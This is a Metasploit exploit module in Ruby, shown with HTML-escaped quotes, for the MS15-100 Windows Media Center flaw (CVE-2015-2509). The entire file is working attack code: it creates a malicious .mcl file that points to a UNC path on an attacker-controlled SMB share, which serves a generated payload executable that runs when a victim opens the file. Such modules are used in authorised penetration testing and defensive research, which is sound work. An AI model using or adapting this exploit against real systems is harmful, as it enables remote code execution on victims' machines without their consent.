# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::SMB::Server::Share
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "MS15-100 Microsoft Windows Media Center MCL Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in Windows Media Center. By supplying
        an UNC path in the *.mcl file, a remote file will be automatically downloaded,
        which can result in arbitrary code execution.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;sinn3r&#039;,
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2015-2509&#039;],
          [&#039;MSB&#039;, &#039;MS15-100&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;DisablePayloadHandler&#039; => &#039;false&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Windows&#039;, {}],
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Sep 8 2015",
      &#039;DefaultTarget&#039;  => 0))
 
      register_options(
        [
          OptString.new(&#039;FILENAME&#039;, [true, &#039;The MCL file&#039;, &#039;msf.mcl&#039;]),
          OptString.new(&#039;FILE_NAME&#039;, [ false, &#039;The name of the malicious payload to execute&#039;, &#039;msf.exe&#039;])
        ], self.class)
 
      deregister_options(&#039;FILE_CONTENTS&#039;)
  end
 
  def generate_mcl
    %Q|<application run="#{unc}" />|
  end
 
  def primer
    self.file_contents = generate_payload_exe
    print_status("Malicious executable at #{unc}...")
 
    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
    mcl = generate_mcl
    file_create(mcl)
  end
 
end

